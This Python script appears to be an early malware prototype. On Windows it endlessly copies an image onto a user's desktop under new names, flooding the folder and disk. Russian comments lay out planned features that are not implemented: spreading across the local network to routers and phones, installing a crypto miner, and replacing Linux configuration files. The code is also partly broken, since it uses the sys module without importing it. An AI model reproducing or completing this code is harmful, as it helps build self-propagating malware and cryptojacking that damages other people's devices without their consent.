import os
import shutil
from pathlib import Path
import time 
mode = os.name
print (mode)
# os windows__________________________copy
if mode == "nt":
    timefrize = 0.3
    Desktop = r'D:\Users\Rusik\Desktop'
    file = os.path.abspath('unnamed (60)(1).jpg')
    #print(file)
    #print(Desktop)
    number = 1
    while True:
        while True == os.path.exists(fr'D:\Users\Rusik\Desktop\unnamed (60)({number}).jpg'):
            number += 1
        shutil.copy2(file, Desktop)
        print ("файл скоирован")
        title1 = r'D:\Users\Rusik\Desktop\unnamed (60)(1).jpg'
        title2 = fr'D:\Users\Rusik\Desktop\unnamed (60)({number}).jpg'
        os.rename(title1, title2 )
        number = number + 1
        time.sleep(timefrize)
        #передача  на другие устройства в локальной сети
        #передача файлов на роутер/маршрутизатор
        #передача файлов на телефоны
        #майнер
elif mode == "posix":
    #получение разницы андроид и линукс
    if hasattr(sys, 'getandroidapilevel'):
        print("андроид")
        #майнер
        #передача  на другие устройства в локальной сети
        #передача файлов на роутер/маршрутизатор
        #передача файлов на телефоны
    else:
        print("линукс")  
        #подмена файов конфигурации
        #передача  на другие устройства в локальной сети
        #передача файлов на роутер/маршрутизатор
        #передача файлов на телефоны